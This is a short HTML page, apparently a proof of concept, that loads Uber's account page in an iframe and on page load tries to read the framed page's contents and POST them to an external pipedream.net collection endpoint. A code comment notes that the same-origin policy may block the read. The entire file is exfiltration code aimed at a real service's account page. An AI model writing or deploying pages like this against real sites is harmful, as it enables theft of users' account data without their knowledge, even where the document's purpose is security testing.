<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Intermediary Page</title>
    <script>
        function extractAndSendData() {
            // This might not work due to Same-Origin Policy, unless CORS headers are set appropriately.
            let content = document.getElementById('targetIframe').contentDocument.body.innerHTML;
            
            fetch('https://476f5920d79cc7312879c97ebd59d780.m.pipedream.net', {
                method: 'POST',
                headers: { 'Content-Type': 'text/html' },
                body: content
            }).then(response => {
                console.log("Data sent!");
            }).catch(error => {
                console.error("Error sending data:", error);
            });
        }
    </script>
</head>
<body>
    <iframe id="targetIframe" src="https://account.uber.com/?host_theme=light" onload="extractAndSendData()"></iframe>
</body>
</html>
